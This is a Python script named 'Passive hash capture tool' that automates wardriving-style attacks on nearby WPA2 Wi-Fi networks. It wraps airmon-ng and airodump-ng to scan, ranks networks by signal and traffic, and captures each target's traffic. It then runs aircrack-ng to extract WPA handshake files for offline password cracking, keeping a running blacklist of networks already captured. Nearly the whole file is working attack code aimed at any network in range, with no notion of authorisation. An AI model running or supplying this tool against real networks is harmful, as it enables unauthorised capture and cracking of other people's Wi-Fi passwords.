#!/usr/bin/env python

###  Passive hash capture tool  #
##       { VERSION 2.0 }       ##
#           By D3falt         ###

from __future__ import print_function
import os
import subprocess
import time
import signal
import glob, os, os.path
import sys
from datetime import datetime
import random
import shutil
import glob
import threading
import re

datafolder = "/root/passive/"


class colors:
	reset='\033[0m'
	bold='\033[01m'
	disable='\033[02m'
	underline='\033[04m'
	reverse='\033[07m'
	strikethrough='\033[09m'
	invisible='\033[08m'
	class fg:
		black='\033[30m'
		red='\033[31m'
		green='\033[32m'
		orange='\033[33m'
		blue='\033[34m'
		purple='\033[35m'
		cyan='\033[36m'
		lightgrey='\033[37m'
		darkgrey='\033[90m'
		lightred='\033[91m'
		lightgreen='\033[92m'
		yellow='\033[93m'
		lightblue='\033[94m'
		pink='\033[95m'
		lightcyan='\033[96m'
	class bg:
		black='\033[40m'
		red='\033[41m'
		green='\033[42m'
		orange='\033[43m'
		blue='\033[44m'
		purple='\033[45m'
		cyan='\033[46m'
		lightgrey='\033[47m'

def firsttime():
	if os.path.isdir(datafolder) == False:
		print ("Creating directory: "+datafolder)
		os.makedirs(datafolder)
	if os.path.isdir(datafolder+"active/") == False:
		print ("Creating directory: "+datafolder+"active/")
		os.makedirs(datafolder+"active/")
	if os.path.isdir(datafolder+"captures/") == False:
		print ("Creating directory: "+datafolder+"captures/")
		os.makedirs(datafolder+"captures/")
	if os.path.isfile(datafolder+"blacklist.txt") == False:
		print ("Creating file: "+datafolder+"blacklist.txt")
		f = open(datafolder+"blacklist.txt","a")
		f.write(
			"## BLACKLIST LIST\n"+
			"##   The script will blacklist WIFI networks if a captured hash is found\n"+
			"##   You might also want to add your own\n"+
			"##   Add either BSSID example: \"D4:41:FC:64:66:CE\" or ESSID example: \"YourWifiName\" (without quotes)\n"
			)
		f.close()
	print ("Cloning file: "+os.path.realpath(__file__)+" ==> /usr/bin/passive")
	shutil.copy(__file__, '/usr/bin/passive')
	print ("Changing filepermission to 0755 for /usr/bin/passive")
	subprocess.call(['chmod', '+x', '/usr/bin/passive'])
	print ("\n[+] Successfully installed")
	print ("Run with this command:")
	print ("  passive")
	print ("Or just continue using \"python " + os.path.realpath(__file__)) + "\""
	exit()

def pwr_to_percent(pwr):
	# I didn't bother to write the algorythm for this
	# the power to percent ratio should be a curve that slows down the better the signal is
	# https://www.intuitibits.com/2016/03/23/dbm-to-percent-conversion/
	tmpnum = int(pwr)*-1
	if tmpnum > 93:
		return 0.01
	elif tmpnum < 21:
		return 1.00
	dbms = [1.00,1.00,1.00,1.00,1.00,1.00,1.00,1.00,1.00,1.00,1.00,1.00,1.00,1.00,1.00,1.00,1.00,1.00,1.00,1.00,0.99,0.99,0.99,0.98,0.98,0.98,0.97,0.97,0.96,0.96,0.95,0.95,0.94,0.93,0.93,0.92,0.91,0.90,0.90,0.89,0.88,0.87,0.86,0.85,0.84,0.83,0.82,0.81,0.80,0.79,0.78,0.76,0.75,0.74,0.73,0.71,0.70,0.69,0.67,0.66,0.64,0.63,0.61,0.60,0.58,0.56,0.55,0.53,0.51,0.50,0.48,0.46,0.44,0.42,0.40,0.38,0.36,0.34,0.32,0.30,0.28,0.26,0.24,0.22,0.20,0.17,0.15,0.13,0.10,0.08,0.06,0.03,0.01,0.01,0.01,0.01,0.01,0.01,0.01,0.01]
	return dbms[tmpnum]

def toggle_mon(interface):
	if "mon" in interface:
		os.system("airmon-ng stop "+interface)
	else:
		os.system("airmon-ng start "+interface)

def boxprint(text):
	global box_width
	thetime = datetime.today().strftime('%Y%m%d %H:%M:%S')
	clockstring = colors.fg.orange + "[" + colors.reset + thetime + colors.fg.orange + "] "
	if "\n" in text:
		for line in text.split("\n"):
			print(colors.fg.cyan + "| " + clockstring + colors.reset + line + (" "*(box_width-len(line)-23)) + colors.fg.cyan + "|")
	else:
		print(colors.fg.cyan + "| " + clockstring + colors.reset + text + (" "*(box_width-len(text)-23)) + colors.fg.cyan + "|")

def boxprint_error(text):
	global box_width
	thetime = datetime.today().strftime('%Y%m%d %H:%M:%S')
	clockstring = colors.fg.orange + "[" + colors.reset + thetime + colors.fg.orange + "] "
	if "\n" in text:
		for line in text.split("\n"):
			print(colors.fg.cyan + "| " + clockstring + colors.fg.red + line + (" "*(box_width-len(line)-23)) + colors.fg.cyan + "|")
	else:
		print(colors.fg.cyan + "| " + clockstring + colors.fg.red + text + (" "*(box_width-len(text)-23)) + colors.fg.cyan + "|")

def boxprint_success(text):
	global box_width
	thetime = datetime.today().strftime('%Y%m%d %H:%M:%S')
	clockstring = colors.fg.orange + "[" + colors.reset + thetime + colors.fg.orange + "] "
	if "\n" in text:
		for line in text.split("\n"):
			print(colors.fg.cyan + "| " + clockstring + colors.fg.green + line + (" "*(box_width-len(line)-23)) + colors.fg.cyan + "|")
	else:
		print(colors.fg.cyan + "| " + clockstring + colors.fg.green + text + (" "*(box_width-len(text)-23)) + colors.fg.cyan + "|")

def boxprint_info(text):
	global box_width
	thetime = datetime.today().strftime('%Y%m%d %H:%M:%S')
	clockstring = colors.fg.orange + "[" + colors.reset + thetime + colors.fg.orange + "] "
	if "\n" in text:
		for line in text.split("\n"):
			print(colors.fg.cyan + "| " + clockstring + colors.fg.cyan + line + (" "*(box_width-len(line)-23)) + colors.fg.cyan + "|")
	else:
		print(colors.fg.cyan + "| " + clockstring + colors.fg.cyan + text + (" "*(box_width-len(text)-23)) + colors.fg.cyan + "|")

def file_get_contents(filename):
	with open(filename) as f:
		return f.read()

def getblacklist():
	rawblacklist = file_get_contents(datafolder+"blacklist.txt")
	blacklist = []
	for line in rawblacklist.split("\n"):
		if "#" in line:
			line = line.split("#")[0]
		if line.strip() != "":
			blacklist.append(line.strip())
	return blacklist

def csv_to_array(text):
	temparray = []
	for elm in text.split(","):
		temparray.append(elm.strip())
	return temparray

def clean_capture(interface):
	files = [
		"cap-"+interface+"-01.cap",
		"cap-"+interface+"-01.csv",
		"cap-"+interface+"-01.kismet.csv",
		"cap-"+interface+"-01.kismet.netxml",
		"cap-"+interface+"-01.log.csv"
	]
	for file in files:
		os.remove(datafolder+"active/"+interface+"/"+file)

def complete_clean(interface):
	for file in glob.glob(datafolder+"active/"+interface+"/*"):
		boxprint_info ("Deleting: " + file)
		if os.path.isfile(file) == True:
			os.remove(file)
		if os.path.isdir(file) == True:
			shutil.rmtree(file)

def formatName(name):
	return re.sub(r'\W+', '', name)

def findnexttarget(interface):
	global active
	boxprint("Looking for target on " + interface)
	time.sleep(2)
	info = file_get_contents(datafolder+"active/"+interface+"/scan-"+interface+"-01.csv")
	info = info.strip()
	info_array = []
	blacklist = getblacklist()
	busy = []
	for elm in active:
		if elm[0] != interface:
			busy.append(elm[3])

	skipfirstline=True
	for line in info.split("\n"):
		if line.strip() == "":
			break
		if skipfirstline==True:
			skipfirstline=False
			continue
		if "WPA2" not in line:
			continue
		ESSID = line.split(",")[-2].strip()
		BSSID = line.split(",")[0].strip()
		found = False
		for elm in busy + blacklist:
			if elm.lower() == ESSID.lower():
				found = True
			elif elm.lower() == BSSID.lower():
				found = True
		if found == True:
			continue
		line+=","
		info_array.append(csv_to_array(line))

		c=0
		for elm in info_array:
			info_array[c][-1] = float(info_array[c][9])*pwr_to_percent(info_array[c][8])
			c+=1

	info_array.sort(key=lambda x:x[-1],reverse=True)

	c=0
	for elm in active:
		if elm[0] == interface:
			score = float(info_array[c][-1])
			boxprint("chosing " + info_array[0][13] + ", score: " + str(round(score, 2)))
			active[c][3] = info_array[0][13] # name
			active[c][4] = info_array[0][3]  # channel
			active[c][5] = info_array[0][0]  # BSSID
		c+=1

def thread_running(interface):
	foundthread = False
	for thathread in threading.enumerate():
		if thathread.name == interface:
			foundthread = True
	if foundthread == False:
		return False

def get_wl_interfaces():
	command = "find /sys/class/net -follow -maxdepth 2 -name wireless"
	process = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True, shell=True)
	output = process.communicate()
	stdout = output[0]
	stderr = output[1]

	network_interfaces = []
	for interface in stdout.split("\n"):
		if interface.strip() != "":
			interface = interface.strip().split("/")[-2]
			network_interfaces.append(interface)

	network_interfaces.sort()
	return network_interfaces

def sendcommand(cmd, interface, suicide_watch):
	if suicide_watch == 0:
		os.popen(cmd)
	else:
		os.popen(cmd + " & sleep "+str(suicide_watch)+" ; kill $!")

if os.path.isdir(datafolder) == False and os.path.isfile("/usr/bin/passive") == False:
	firsttime()

timescanning = 60*3 # 3 minutes
timecapture = 60*15 # 15 minutes

# start by clearing processes
for file in glob.glob(datafolder+"active/*"):
	print (colors.fg.cyan + "Deleting: " + colors.reset + file)
	if os.path.isfile(file) == True:
		os.remove(file)
	if os.path.isdir(file) == True:
		shutil.rmtree(file)

# Checking for network interfaces in monitor mode
interface = ""
while True:
	network_interfaces = get_wl_interfaces()
	c=0
	print ()
	for interface in network_interfaces:
		indicator = ""
		if "mon" in interface: 
			indicator = colors.fg.cyan
		print ("[ "+str(c)+" ] " + indicator + interface.split("/")[-1] + colors.reset)
		c+=1
	user_choise = raw_input(colors.fg.cyan + "What network interfaces do you want to toggle monitor mode?"+colors.reset+" ( [0-"+str(c-1)+"]/[EMPTY]/q )\n > ")
	if user_choise == "q":
		exit()
	elif user_choise.isdigit():
		choise = int(user_choise)
		if choise >= 0 and c-1 >= choise:
			toggle_mon(network_interfaces[choise])
	elif user_choise == "":
		break

for interface in get_wl_interfaces():
	if "mon" in interface:
		if not os.path.exists(datafolder+"active/"+interface):
			os.makedirs(datafolder+"active/"+interface)

print (colors.fg.cyan)


box_width = 85

print ("/###################################################################################\\")
print ("|/                                                                                 \\|")
print ("|                             "+colors.reset+"Passive packet scanner 2.0"+colors.fg.cyan+"                            |")
print ("|\\                                                                                 /|")
print ("\\###################################################################################/")
print ("|-----------------------------------------------------------------------------------|")
print ("|                                                                                   |")

active = []

#if you have 3 network interfaces, it might look something like this:
#active = [
#   0,          1,     2,         3,               4,        5
#   interface,  state, countdown  focused network  channel,  bssid
#	["wlan0mon", 0,     300,       "",              "",       "" ],
#	["wlan1mon", 0,     300,       "",              "",       "" ],
#	["wlan2mon", 0,     300,       "",              "",       "" ],
#]
# state 0: scan
# state 1: capture
# state 2: look for handshake

timescanning = 60*3 # 3 minutes
timecapture = 60*20 # 15 minutes
thasleep = 5 # time before each loop on all interfaces

processThread = threading.Thread();

while True:
	for file in glob.glob(datafolder+"active/*"):
		interface = file.split("/")[-1]
		if interface not in get_wl_interfaces():
			boxprint_error(interface + " is not a valid interface")
			boxprint("deleting " + file)
			shutil.rmtree(file)
			continue
		
		c=0
		found = False
		for elm in active: # for active interfaces
			if elm[0] == interface: # if interface
				if elm[1] == 0: # if in scan mode
					active[c][2] = active[c][2]-thasleep
					foundthread = False
					for thathread in threading.enumerate():
						if thathread.name == interface:
							foundthread = True
					if foundthread == False:
						active[c][1] = 1
				elif elm[1] == 1: # if in capture mode
					if elm[3] == "": # start for the first time, or when previous network was cracked
						findnexttarget(interface)
						tempelm = []
						for elm2 in active: # need to load from active again
							if elm2[0] == interface:
								tempelm = elm2
						boxprint("starting capture of "+tempelm[3]+" on " + interface + " ("+str(timecapture)+"s) ...")
						cmd = "airodump-ng -K 1 -c "+str(tempelm[4])+" --bssid "+tempelm[5]+" -w "+datafolder+"active/"+interface+"/cap-"+interface + " "+ interface
						processThread = threading.Thread(target=sendcommand, args=[cmd, interface, timecapture], name=interface).start()
					elif os.path.isfile(datafolder+"active/"+interface+"/crack-"+interface+".hccap") == True and thread_running(interface) == False: # this is if cracking failed
						os.remove(datafolder+"active/"+interface+"/crack-"+interface+".hccap")
						boxprint("continuing capture of "+elm[3]+" on " + interface + " ("+str(timecapture)+"s) ...")
						cmd = "airodump-ng -K 1 -c "+str(elm[4])+" --bssid "+elm[5]+" -w "+datafolder+"active/"+interface+"/cap-"+interface + " "+ interface
						processThread = threading.Thread(target=sendcommand, args=[cmd, interface, timecapture], name=interface).start()

					if thread_running(interface) == False:
						active[c][1] = 2
				elif elm[1] == 2: # if in look mode
					boxprint("Looking for handshake on " + elm[3])
					cmd = "aircrack-ng -J "+datafolder+"active/"+interface+"/crack-"+interface+" "+datafolder+"active/"+interface+"/cap-"+interface+"-01.cap"

					proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
					(out, err) = proc.communicate()
					for line in out.split("\n"):
						line = line.strip()
						if active[c][5] in line and active[c][3] in line:
							boxprint (line.split(active[c][5])[1].strip())
						elif "Key version" in line:
							boxprint (line.split("[*] ")[1])
					if "handshake" in out and not "Key version: 0" in out:
						boxprint_success("Handshake found for "+elm[3])
						formatted_ESSID = formatName(elm[3])
						time.sleep(1)
						boxprint("Saving to "+datafolder+"captures/"+formatted_ESSID)
						shutil.copy2(datafolder+"active/"+interface+"/crack-"+interface+".hccap", datafolder+"captures/"+formatted_ESSID+".hccap")
						shutil.copy2(datafolder+"active/"+interface+"/cap-"+interface+"-01.cap", datafolder+"captures/"+formatted_ESSID+".cap")
						time.sleep(1)
						boxprint("Appending BSSID to blacklist ...")
						with open(datafolder+"blacklist.txt", "a") as myfile:
							myfile.write("\n"+elm[5]+"  # " + formatted_ESSID)
						active[c] = [interface, 0, timescanning, "", "", ""]
						complete_clean(interface)
						boxprint("Starting scan on " + interface + " (" + str(timescanning) + "s) ...")
						cmd = "airodump-ng -K 1 "+interface+" -w "+datafolder+"active/"+interface+"/scan-"+interface+" -o csv"
						processThread = threading.Thread(target=sendcommand, args=[cmd, interface, timescanning], name=interface).start()
					else:
						boxprint("Nothing found on "+interface+", continue looking...")
						if os.path.isfile(datafolder+"active/"+interface+"/crack-"+interface+".hccap") == False:
							open(datafolder+"active/"+interface+"/crack-"+interface+".hccap", 'a').close()
						boxprint("cleaning cap trash in: "+datafolder+"active/"+interface + "/")
						active[c][1] = 1
						clean_capture(interface)

				found = True

			c+=1
		if found == False:
			active.append([interface, 0, timescanning, "", "", ""])
			boxprint(interface + " found, initializing scanning")
			boxprint("Starting scan on " + interface + " (" + str(timescanning) + "s) ...")
			cmd = "airodump-ng -K 1 "+interface+" -w "+datafolder+"active/"+interface+"/scan-"+interface+" -o csv"
			processThread = threading.Thread(target=sendcommand, args=[cmd, interface, timescanning], name=interface).start()
			

	time.sleep(thasleep)
